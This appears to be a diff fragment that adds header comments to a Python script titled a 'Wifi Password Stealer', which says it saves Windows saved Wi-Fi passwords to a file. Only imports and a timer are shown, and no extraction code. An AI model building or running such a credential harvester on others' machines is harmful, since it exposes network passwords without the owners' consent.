@@ -1,3 +1,5 @@
+# Wifi Password Stealer Created By Shail
+# This program will save saved WiFi passwords of Windows OS in File named window.txt
 from time import time
 from os import environ, popen, system
 start_time = time()
